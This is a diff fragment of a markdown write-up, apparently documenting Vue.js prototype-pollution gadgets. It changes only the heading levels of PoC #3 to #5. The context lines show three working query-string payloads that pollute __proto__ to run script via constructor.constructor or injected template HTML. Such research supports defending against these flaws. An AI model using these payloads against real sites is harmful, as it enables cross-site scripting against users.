@@ -56,7 +56,7 @@ var app = new Vue({
 </script>
 ```
 
-### PoC #3
+#### PoC #3
 ```
 ?__proto__[v-bind:class]=''.constructor.constructor('alert(1)')()
 ```
@@ -79,7 +79,7 @@ var app = new Vue({
 </script>
 ```
 
-### PoC #4
+#### PoC #4
 ```
 ?__proto__[data]=a&__proto__[template][nodeType]=a&__proto__[template][innerHTML]=<script>alert(1)</script>
 ```
@@ -105,7 +105,7 @@ var app = new Vue({
 </script>
 ```
 
-### PoC #5
+#### PoC #5
 ```
 ?__proto__[props][][value]=a&__proto__[name]=":''.constructor.constructor('alert(1)')(),"
 ```
